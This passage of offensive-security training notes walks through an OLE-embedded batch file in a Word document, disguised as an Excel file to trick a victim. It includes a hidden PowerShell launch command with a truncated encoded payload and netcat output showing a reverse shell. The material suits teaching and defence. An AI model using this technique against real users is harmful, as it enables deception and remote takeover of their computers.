Another popular client-side attack against Microsoft Office abuses Dynamic Data Exchange (DDE) to execute arbitrary applications from within Office documents, but this has been patched since December of 2017.3

However, we can still leverage Object Linking and Embedding (OLE) to abuse Microsoft Office's document-embedding feature.

In this attack scenario, we are going to embed a Windows batch file inside a Microsoft Word document.

Windows batch files are an older format, often replaced by more modern Windows native scripting languages such as VBScript and PowerShell. However, batch scripts are still fully functional even on Windows 10 and allow for execution of applications. The following listing presents an initial proof-of-concept batch script (launch.bat) that launches cmd.exe:

```batch
START cmd.exe
```

Next, we will include the above script in a Microsoft Word document. We will open Microsoft Word, create a new document, navigate to the Insert ribbon, and click the Object menu. Here, we will choose the Create from File tab and select our newly-created batch script, launch.bat:

![[Pasted image 20221106124821.png]]

We can also change the appearance of the batch file within the Word document to make it look more benign. To do this, we simply check the Display as icon check box and choose Change Icon, which brings up the menu box seen below, allowing us to make changes:

![[Pasted image 20221106124936.png]]

Even though this is an embedded batch file, Microsoft allows us to pick a different icon for it and enter a caption, which is what the victim will see, rather than the actual file name. In the example above, we have chosen the icon for Microsoft Excel along with a name of ReadMe.xls to fully mask the batch file in an attempt to lower the suspicions of the victim. After accepting the menu options, the batch file is embedded in the Microsoft Word document. Next, the victim must be tricked into double-clicking it and accepting the security warning shown below:

![[Pasted image 20221106125048.png]]

As soon as the victim accepts the warning, cmd.exe is launched. Once again, we have the ability to execute an arbitrary program and must convert this into execution of PowerShell with a Base64 encoded command. This time, the conversion is very simple, and we can simply change cmd.exe to the previously-used invocation of PowerShell as seen in the following script:

```batch
START powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj....
```

After embedding the updated batch file, double-clicking it results in a working reverse shell.

```bash
kali@kali:~$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 50115
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Offsec>
```